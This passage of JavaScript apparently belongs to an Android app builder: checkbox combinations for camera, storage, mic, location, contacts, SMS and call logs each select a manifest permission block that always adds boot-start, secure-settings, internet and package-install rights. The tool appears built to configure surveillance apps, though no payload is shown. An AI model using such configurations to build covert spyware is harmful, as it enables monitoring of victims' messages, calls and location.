            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        // if 5 checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
